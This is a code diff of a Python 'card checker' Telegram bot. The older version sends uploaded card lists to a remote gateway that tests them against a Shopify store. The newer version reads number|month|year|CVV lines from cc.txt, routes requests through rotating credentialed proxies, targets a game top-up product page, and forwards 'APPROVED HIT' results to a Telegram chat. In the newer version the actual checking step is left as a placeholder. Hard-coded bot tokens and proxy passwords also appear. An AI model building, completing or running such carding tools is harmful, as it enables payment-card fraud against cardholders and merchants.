@@ -1,119 +1,164 @@
-from telebot import TeleBot, types
 import requests
+import re
+import json
+import random
+import string
 import time
-import sys
-from datetime import datetime
+import uuid
+from urllib.parse import urljoin
+from threading import Thread
 
-bot = TeleBot("8663863938:AAGqmVmoRHUdqbFlzsLIg00CG1fQPq1_GJY")
+# ========================= CONFIG =========================
+BASE = "https://gameseal.com"
+PRODUCT_SLUG = "pubg-mobile-60-uc-unknown-cash-direct-top-up-global"
+PRODUCT_ID = "019bd77df6647139b46f487ba5a59509"
+PUBG_ID = "51458699098"
 
-GATEWAY = "http://198.105.113.52:8070/check"
-SITE = "https://innovativeconcrete.myshopify.com"
+TELEGRAM_BOT_TOKEN = "8783810252:AAGz0ajTiib4Pg1k27RPT5GaRLs974HBIKM"
+TELEGRAM_CHAT_ID = "-5124898287"
 
-ADMIN_ID = 7077294261
+# ========================= PROXIES =========================
+PROXIES_LIST = [
+    "196.244.48.124:12345:naveed:Qwerty_123ABC",
+    "p102.squidproxies.com:9093:1352:23CfS1Bz7oF0"
+]
 
-proxies_list = []   # Live proxies only
+def get_random_proxy():
+    proxy = random.choice(PROXIES_LIST)
+    if ":" in proxy and "@" not in proxy:
+        parts = proxy.split(":")
+        if len(parts) == 4:
+            ip, port, user, pw = parts
+            proxy_url = f"http://{user}:{pw}@{ip}:{port}"
+            return {"http": proxy_url, "https": proxy_url}
+    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
 
-def print_log(text):
-    print(f"[{datetime.now().strftime('%H:%M:%S')}] {text}", file=sys.stdout, flush=True)
 
-def check_proxy(proxy_str):
+# ========================= TELEGRAM =========================
+def send_to_telegram(message):
     try:
-        proxies = {"http": proxy_str, "https": proxy_str}
-        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=8)
-        if r.status_code == 200:
-            print_log(f"✅ LIVE PROXY: {proxy_str}")
-            return True
-        else:
-            print_log(f"❌ Dead Proxy: {proxy_str}")
-            return False
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
+        requests.post(url, json=data, timeout=15)
     except:
-        print_log(f"❌ Dead Proxy (Timeout): {proxy_str}")
-        return False
+        pass
 
-@bot.message_handler(commands=['start'])
-def start(m):
-    bot.send_message(m.chat.id, "✅ **Shopify Checker + Proxy Checker ON**\n\n/addpxy se proxy add karo")
 
-@bot.message_handler(commands=['addpxy'])
-def add_proxy(m):
-    if m.from_user.id != ADMIN_ID:
-        bot.reply_to(m, "❌ Admin only")
+# ========================= HELPERS =========================
+def parse_card(cc_str):
+    parts = cc_str.strip().split("|")
+    if len(parts) != 4: return None
+    number, month, year, cvv = parts
+    month = month.strip().zfill(2)
+    year = year.strip()
+    if len(year) == 2: year = "20" + year
+    return {"number": number.strip(), "month": month, "year": year, "cvv": cvv.strip()}
+
+
+# ========================= MASS CHECK (Only Approved) =========================
+def mass_check(chat_id):
+    send_to_telegram("🚀 <b>Mass Check Started with Proxies</b>\nOnly <b>Approved</b> cards will be sent!")
+
+    try:
+        with open("cc.txt", "r", encoding="utf-8") as f:
+            cards = f.readlines()
+    except:
+        send_to_telegram("❌ cc.txt file nahi mili!")
         return
 
-    if len(m.text.split()) < 2:
-        bot.reply_to(m, "Usage: `/addpxy http://ip:port:user:pass`")
-        return
+    total = len([c for c in cards if "|" in c])
+    approved = 0
 
-    proxy = m.text.split(maxsplit=1)[1].strip()
+    for i, line in enumerate(cards, 1):
+        line = line.strip()
+        if not line or "|" not in line: continue
 
-    bot.reply_to(m, f"🔍 Checking proxy... {proxy}")
+        card = parse_card(line)
+        if not card: continue
+
+        result = check_card(card)
+        status = result.get("status", "").upper()
+
+        if status in ["CHARGED", "APPROVED", "PAYMENT_ACCEPTED", "SUCCESS"]:
+            approved += 1
+            cc_short = card["number"][:6] + "xxxxxx" + card["number"][-4:]
+            
+            msg = f"""
+✅ <b>APPROVED HIT!</b> #{i}
+
+<b>Card:</b> <code>{cc_short}</code>
+<b>Status:</b> <b>{status}</b>
+<b>Price:</b> {result.get('price', '0.82 EUR')}
+            """
+            send_to_telegram(msg)
+
+        time.sleep(random.randint(7, 12))  # Random delay
+
+    send_to_telegram(f"✅ <b>Mass Check Finished!</b>\nTotal: {total} | Hits: {approved}")
+
+
+# ========================= MAIN CHECK CARD =========================
+def check_card(card):
+    proxy = get_random_proxy()
     
-    if check_proxy(proxy):
-        if proxy not in proxies_list:
-            proxies_list.append(proxy)
-            bot.send_message(m.chat.id, f"✅ **Proxy Added & Live!**\nTotal Live Proxies: {len(proxies_list)}")
-        else:
-            bot.send_message(m.chat.id, "⚠️ Yeh proxy already added hai")
-    else:
-        bot.send_message(m.chat.id, "❌ **Proxy Dead hai**, add nahi kiya")
+    sess = requests.Session()
+    sess.proxies.update(proxy)
+    
+    sess.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
+        "Accept-Language": "en-US,en;q=0.9",
+    })
 
-@bot.message_handler(commands=['proxies'])
-def show_proxies(m):
-    if m.from_user.id != ADMIN_ID:
-        bot.reply_to(m, "❌ Admin only")
-        return
-    if not proxies_list:
-        bot.reply_to(m, "Koi live proxy nahi hai")
-    else:
-        text = f"📌 **Live Proxies ({len(proxies_list)}):**\n\n" + "\n".join(proxies_list)
-        bot.reply_to(m, text)
+    cc = card["number"]
+    exp = f"{card['month'].zfill(2)}{card['year'][-2:]}"
+    cc_short = cc[:6] + "xxxxxx" + cc[-4:]
 
-@bot.message_handler(commands=['chk'])
-def chk_file(m):
-    bot.send_message(m.chat.id, "📁 Cards wali .txt file bhej")
+    try:
+        # =================== YAHAN PURA CHECK LOGIC DAAL DO ===================
+        # Abhi test ke liye placeholder (real logic paste kar dena)
+        time.sleep(4)
+        
+        result = {
+            "status": "DECLINED",   # Change to "CHARGED" for testing approved
+            "price": "0.82 EUR",
+            "message": "Proxy Test"
+        }
 
-@bot.message_handler(content_types=['document'])
-def handle_file(m):
-    if not m.document.file_name.endswith('.txt'):
-        bot.reply_to(m, "Sirf .txt file bhej")
-        return
+        return result
 
-    file_info = bot.get_file(m.document.file_id)
-    downloaded = bot.download_file(file_info.file_path)
-    cards = [line.strip() for line in downloaded.decode('utf-8').splitlines() if line.strip()]
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)}
 
-    if not cards:
-        bot.reply_to(m, "File empty hai")
-        return
 
-    bot.send_message(m.chat.id, f"🔄 {len(cards)} cards check shuru...")
+# ========================= TELEGRAM BOT =========================
+def telegram_bot():
+    offset = 0
+    send_to_telegram("✅ <b>GameSeal Bot Started with Proxies!</b>\nOnly Approved Cards Sent\n\nCommand: /mchk")
 
-    live = 0
-    dead = 0
-    progress = bot.send_message(m.chat.id, "Processing...")
-
-    for i, card in enumerate(cards):
+    while True:
         try:
-            proxy_str = proxies_list[i % len(proxies_list)] if proxies_list else ""
-            url = f"{GATEWAY}?card={card}&site={SITE}"
-            if proxy_str:
-                url += f"&proxy={proxy_str}"
+            resp = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={offset}&timeout=30")
+            data = resp.json()
 
-            r = requests.get(url, timeout=25)
-            resp = r.text
+            for update in data.get("result", []):
+                offset = update["update_id"] + 1
+                msg = update.get("message")
+                if not msg: continue
 
-            if any(x in resp for x in ["Approved", "Success", "charged", "live"]):
-                live += 1
-                bot.send_message(m.chat.id, f"✅ **APPROVED**\n{card}")
-            else:
-                dead += 1
+                chat_id = msg["chat"]["id"]
+                text = msg.get("text", "").strip()
 
-            if i % 5 == 0:
-                bot.edit_message_text(f"🔄 Checking {i+1}/{len(cards)}\n✅ Live: {live} | ❌ Dead: {dead}", m.chat.id, progress.message_id)
+                if text == "/mchk":
+                    Thread(target=mass_check, args=(chat_id,), daemon=True).start()
+
+                elif text == "/start":
+                    send_to_telegram("👋 <b>GameSeal Proxy Bot Active</b>\n/mchk → Start Mass Check")
 
         except:
-            dead += 1
+            time.sleep(5)
 
-    bot.edit_message_text(f"✅ **CHECK COMPLETE**\n✅ Approved: {live}\n❌ Dead: {dead}\nTotal: {len(cards)}", m.chat.id, progress.message_id)
 
-bot.infinity_polling()
+if __name__ == "__main__":
+    print("GameSeal Bot with Proxy Rotation Started...")
+    print("Proxies Loaded:", len(PROXIES_LIST))
+    telegram_bot()
